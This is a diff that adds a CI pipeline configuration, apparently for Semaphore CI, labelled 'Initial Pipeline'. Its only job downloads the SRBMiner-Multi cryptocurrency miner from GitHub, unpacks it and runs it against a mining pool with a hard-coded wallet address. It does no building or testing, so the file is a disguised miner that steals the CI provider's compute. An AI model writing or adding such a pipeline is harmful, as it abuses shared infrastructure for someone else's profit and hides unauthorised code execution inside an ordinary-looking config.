@@ -1,0 +1,14 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.6.6/SRBMiner-Multi-0-6-6-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-6-6-Linux.tar.xz && cd SRBMiner-Multi-0-6-6 && ./SRBMiner-MULTI --algorithm verushash --pool na.luckpool.net:3956 --wallet RTBTgVXVZdfeYXtMVUhtJm6soVWrQTCFPZ --disable-gpu --cpu-threads 2'
+
